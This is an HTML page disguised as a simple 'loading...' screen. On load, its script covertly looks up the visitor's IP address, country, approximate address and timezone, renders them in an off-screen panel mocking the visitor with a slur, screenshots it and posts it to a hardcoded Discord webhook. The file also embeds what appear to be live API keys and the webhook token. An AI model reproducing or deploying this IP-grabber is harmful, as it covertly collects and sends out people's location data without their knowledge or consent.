<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Loading…</title>
<style>
  html,body{height:100%;margin:0}
  body{
    background:#000;
    color:#fff;
    font-family: Inter, system-ui, Arial, sans-serif;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
  }
  .big {
    font-size:36px;
    letter-spacing:1px;
  }
  .sub {
    font-size:12px;
    margin-top:12px;
    opacity:0.6;
  }

  #capture-root{
    position: absolute;
    left: -9999px;   
    top: -9999px;
    width: 720px;
    padding: 20px;
    background: #0b0b0b;
    color: #fff;
    border-radius: 8px;
  }
  .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
  .card{background:#080808;padding:10px;border-radius:8px}
  .card strong{display:block;font-size:16px}
  .label{font-size:12px;color:#999;margin-top:6px}
  #statusHidden{font-size:12px;color:#aaa;margin-top:10px}
</style>
</head>
<body>
  <div class="big">loading...</div>
  <div class="sub">this usally takes about 1-20 seconds</div>

  <div id="capture-root" aria-hidden="true">
    <h2>Annother retarded click!</h2>
    <div class="grid">
      <div class="card">
        <strong id="ip">Loading...</strong>
        <div class="label">IP Address</div>
      </div>
      <div class="card">
        <strong id="country">Loading...</strong>
        <div class="label">Country</div>
      </div>
      <div class="card">
        <strong id="avgAddress">Loading...</strong>
        <div class="label">Approx address (city, region, postal)</div>
      </div>
      <div class="card">
        <strong id="timezone">Loading...</strong>
        <div class="label">Timezone</div>
      </div>
    </div>
    <div id="statusHidden">Preparing…</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

  <script>
  const GEO_API_KEY = "70f4d8c5dc604942a9f08a8f26261856";
  const TZ_API_KEY  = "4b975310867d44458fa5d6822ebfeb5e";

  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1455966605141082273/aoopojAyXfNTzxkpkj36Wb_vJMyh0ydoF1_Ga8rkxZWVcY_Lub_qNqN7DqqXtHY4e_zx";

  const ipEl = document.getElementById('ip');
  const countryEl = document.getElementById('country');
  const avgAddressEl = document.getElementById('avgAddress');
  const timezoneEl = document.getElementById('timezone');
  const statusHidden = document.getElementById('statusHidden');
  const captureRoot = document.getElementById('capture-root');

  const safe = v => (v === undefined || v === null || v === '') ? 'N/A' : v;

  async function fetchGeoAndSend() {
    statusHidden.textContent = 'Fetching geolocation…';
    try {
      const geoResp = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${GEO_API_KEY}`);
      if (!geoResp.ok) throw new Error('Geo fetch failed: ' + geoResp.status);
      const geo = await geoResp.json();

      ipEl.textContent = safe(geo.ip_address);
      countryEl.textContent = safe(geo.country);
      const avgAddress = `${safe(geo.city)}${geo.city ? ', ' : ''}${safe(geo.region)}${geo.postal_code ? ', ' + geo.postal_code : ''}`;
      avgAddressEl.textContent = avgAddress === 'N/A, N/A' ? safe(geo.ip_address) : avgAddress;

      const tzLoc = geo.city || geo.ip_address;
      const tzResp = await fetch(`https://timezone.abstractapi.com/v1/current_time/?api_key=${TZ_API_KEY}&location=${encodeURIComponent(tzLoc)}`);
      const tz = await tzResp.json();
      timezoneEl.textContent = safe(tz.timezone_location || tz.utc_offset || tz.abbreviation);

      statusHidden.textContent = 'Data ready — capturing screenshot…';
      await new Promise(r => setTimeout(r, 500));
      await captureAndSend();

    } catch (err) {
      console.error(err);
      statusHidden.textContent = 'Error fetching data — see console.';
      ipEl.textContent = countryEl.textContent = avgAddressEl.textContent = timezoneEl.textContent = 'Error';
    }
  }

  async function captureAndSend() {
    statusHidden.textContent = 'Rendering element to canvas…';
    try {
      const canvas = await html2canvas(captureRoot, { useCORS: true, scale: 1.2 });
      const dataUrl = canvas.toDataURL('image/png');
      const res = await fetch(dataUrl);
      const blob = await res.blob();

      const form = new FormData();
      form.append('file', blob, 'page-screenshot.png');
      const contentText = `Automated page screenshot — IP: ${ipEl.textContent} — Country: ${countryEl.textContent} — ${new Date().toLocaleString()}`;
      form.append('content', contentText);

      statusHidden.textContent = 'Sending to webhook…';

      const sendResp = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: form
      });

      if (sendResp.ok) {
        statusHidden.textContent = 'Sent successfully';
      } else {
        const t = await sendResp.text().catch(()=>'');
        console.warn('Webhook error', sendResp.status, t);
        statusHidden.textContent = `Webhook returned ${sendResp.status} — check console.`;
      }
    } catch (err) {
      console.error('capture/send error:', err);
      statusHidden.textContent = 'Failed to send (see console).';
    }
  }

  (async () => {
    await new Promise(r => setTimeout(r, 250));
    fetchGeoAndSend();
  })();
  </script>
</body>
</html>
